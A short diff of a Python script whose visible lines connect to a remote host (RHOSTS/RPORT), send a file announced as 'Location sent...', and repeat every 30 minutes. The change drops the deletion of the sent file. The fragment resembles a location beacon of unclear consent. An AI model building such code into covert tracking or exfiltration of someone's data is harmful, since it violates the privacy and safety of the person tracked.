@@ -1,6 +1,5 @@
 #!/bin/python3.10
 from urllib.request import urlopen
-import os
 import json
 import socket
 import time
@@ -35,7 +34,6 @@ while True:
         s.connect((RHOSTS, RPORT))
         s.send(sendFile)
         print("Location sent...")
-        os.remove(filename)
         time.sleep(1800)
 
 # Start the loop over
